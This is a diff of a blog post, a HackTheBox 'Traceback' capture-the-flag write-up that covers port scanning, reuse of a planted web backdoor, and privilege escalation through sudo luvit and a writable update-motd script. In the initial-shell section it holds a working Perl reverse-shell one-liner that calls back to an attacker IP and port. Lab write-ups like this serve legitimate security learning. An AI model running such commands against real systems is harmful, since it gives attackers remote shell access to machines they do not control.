@@ -6,10 +6,17 @@ categories: [Writeup, HackTheBox]
 tags: [hackthebox, htb, traceback]
 ---
 
-<h2 data-toc-skip>Writeup of Traceback Machine (HackTheBox)</h2>
+<h3><strong><span style="color:#ff5555">Traceback - HackTheBox</span></strong></h3>
 
+---
 
 ![Desktop View]({{ "/assets/img/htb-machines/traceback-main.png" | relative_url }})
+
+---
+
+<strong><span style="color:#ff5555">Introduction</span></strong>
+
+---
 
 Today I did Traceback box from HackTheBox.
 It was nice box, CTF-like box in which the website has been hacked and placed one backdoor shell to access.
@@ -18,19 +25,26 @@ So the backdoor shell was the way to get initial shell and then need to get user
 The box was using UpdateMotd which was running one custom script after a particular time. And the user had access to write into 00-header file which was executing.
 Se lets move and Pwn this box.
 
+**This blog is meant for educational purposes only.**
 
 ---
 
-<h3 data-toc-skip>Starting with Nmap</h3>
+<strong><span style="color:#ff5555">Port & Service Enumeration</span></strong>
 
-#### sudo nmap -sC -sV -T4 10.10.10.181
+---
+
+<p><code class="language-plaintext highlighter-rouge">root@kali:~sudo nmap -sC -sV -T4 10.10.10.181</code></p>
 
 ![Desktop View]({{ "/assets/img/htb-machines/blunder-nmap.png" | relative_url }})
 
 We used -sC for Default Script, -sV Service Version Scan, -T4 for Timing.
 As you can see there are two ports open that is port 22 and 80. Port 80 hosting web server which has Apache httpd 2.4.29 also the OS was Ubuntu, so we moved towards port 80 for further enumeration.
 
+---
 
+<strong><span style="color:#ff5555">Web Enumeration</span></strong>
+
+---
 
 After opening the website in browser, There was note from hacker who have defaced the site.
 
@@ -54,11 +68,18 @@ I used default credentials as admin:admin to login into shell.
 ![Desktop View]({{ "/assets/img/htb-machines/traceback-shell-login.png" | relative_url }})
 
 So here we got the access to backdoor shell and it's time to get full interactive shell.
+
+---
+
+<strong><span style="color:#ff5555">Initial Shell</span></strong>
+
+---
+
 Moving forward, I did some google for getting tty shell and got a tty shell using perl command given below.
 
-perl
+```
 perl -e 'use Socket;$i="10.10.14.167";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-
+```
 
 Then I used /usr/bin/script -qc /bin/bash /dev/null to make tty shell interactive.
 
@@ -76,6 +97,12 @@ After doing login by ssh I saw a weird message printed on screen.
 
 ![Desktop View]({{ "/assets/img/htb-machines/traceback-ssh-login.png" | relative_url }})
 
+---
+
+<strong><span style="color:#ff5555">Privilege Escalation: User</span></strong>
+
+---
+
 Anyway lets move further for sysadmin user.
 While enumerating more, I found note.txt which contains,
 
@@ -90,6 +117,13 @@ So for Privilege Escalation and User flag I ran luvit with sudo and executed "/b
 ![Desktop View]({{ "/assets/img/htb-machines/traceback-sysadmin-user.png" | relative_url }})
 
 Next part in Privilege Escalation for root.
+
+---
+
+<strong><span style="color:#ff5555">Privilege Escalation: Root</span></strong>
+
+---
+
 So while enumerating for root, I saw one odd service like,
 
 root       5660  0.0  0.0   4628   772 ?        Ss   17:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
@@ -110,4 +144,4 @@ Then I read flag by appending my command in the 00-header file and re-logged in 
 ![Desktop View]({{ "/assets/img/htb-machines/traceback-root-1.png" | relative_url }})
 
 
-Thanks for reading this writeup and all suggestions are welcome.
+**Thanks for reading this writeup and all suggestions are welcome.**
